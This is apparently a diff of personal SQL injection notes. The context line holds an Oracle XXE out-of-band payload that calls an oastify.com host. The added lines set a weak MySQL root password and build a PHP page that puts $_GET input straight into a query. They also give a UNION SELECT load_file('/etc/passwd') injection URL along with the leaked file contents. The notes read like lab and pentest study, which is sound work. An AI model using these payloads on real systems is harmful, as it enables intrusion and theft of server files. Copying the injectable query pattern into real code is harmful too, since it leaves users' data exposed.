@@ -849,3 +849,99 @@ This solution works for Oracel SQL
 ```sql
 +UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//jsfl9x72zpfgcjxyr6txhc75awgm4b.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
+## Works with SQL
+
+### R**eset MySQL root password on Arch Linux**
+
+```bash
+# Stop service
+sudo systemctl stop mysql
+
+# run in Safe mode
+sudo mysqld_safe --skip-grant-tables --skip-networking &
+
+# login
+mysql -u root
+
+# flush privileges
+# mysql>
+flush privileges;
+
+#set new root password
+set password for root@'localhost'=PASSWORD('root')
+
+# exit from mysql
+quit 
+
+#shutdown mysql then start 
+mysqladmin -u root -p shutdown
+sudo systemctl start mysql
+
+# run my sql with root password
+mysql -u root -p 
+# enter password: root
+```
+
+### Create Database and select it
+
+```sql
+# Create
+Create database test;
+
+# select
+use test;
+```
+
+### Create simple table and insert data
+
+```sql
+# create table
+create table people(id integer, name varchar(100), email varchar(100));
+
+#insert data 
+insert into people(id,name,email) values (1,'rick','rick@gmail.com');
+```
+
+### Connect to mysql with php and load file /etc/passwd with sql query
+
+```php
+<?php
+ini_set('display_errors','1');
+
+$mysqli = new mysqli("localhost","root","root","test");
+
+if ($mysqli -> connect_errno) {
+  echo "Failed to connect to MySQL: " . $mysqli -> connect_error;
+  exit();
+}
+
+$sql= "select * from users where id={$_GET['p']}";
+
+print_r($result = $mysqli->query($sql));
+
+$row = $result->fetch_assoc();
+
+printf("%s (%s)\n", $row['username'],$row["password"]);
+
+$result->free_result();
+
+$mysqli->close();
+```
+
+- Run php server
+
+```bash
+php -S localhost:8000
+```
+
+- injection
+
+```
+http://localhost:8000/mysql.php?p=2/**/union%20select%201,2,load_file(%27/etc/passwd%27)/**/order/**/by/**/1/**/ASC;
+```
+
+- output
+
+```
+2 (root:x:0:0::/root:/usr/bin/zsh bin:x:1:1::/:/usr/bin/nologin,,,,,,
+```
